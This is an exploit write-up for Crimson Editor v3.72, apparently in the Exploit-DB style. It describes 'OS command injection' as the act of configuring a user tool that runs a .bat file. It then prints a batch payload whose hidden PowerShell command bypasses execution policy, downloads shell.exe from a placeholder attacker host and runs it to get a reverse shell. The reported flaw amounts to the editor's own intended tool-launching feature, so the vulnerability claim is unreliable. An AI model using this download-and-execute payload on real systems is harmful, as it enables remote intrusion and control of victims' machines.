---
layout: post
title: Crimson Editor v3.72 - OS Command Injection
date: 2023-09-18
category: exploit
---

# Exploit Title: Crimson Editor v3.72 - OS Command Injection
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 18.09.2023
# Vendor Homepage: http://www.crimsoneditor.com
# Software Link: http://sourceforge.net/project/showfiles.php?group_id=168261
# Tested Version: v3.72 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Create a `.bat` file containing your reverse shell command.
2. Open Crimson Editor and navigate to **Tools > Conf. User Tools...**.
3. In the **Menu Text** box, enter "shell".
4. Click on the three dots next to the **Command** box, select your `.bat` file, and then click **Apply > OK** to save.
5. Go to **Tools** again and select **shell**.
6. Your reverse shell should now be active, connecting to your listener.

### Example of Reverse Shell Command in .bat

To create a reverse shell in a `.bat` file, you can use the following code:

```batch
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://attacker_ip:port -OutFile %TEMP%\shell.exe; Start-Process %TEMP%\shell.exe"
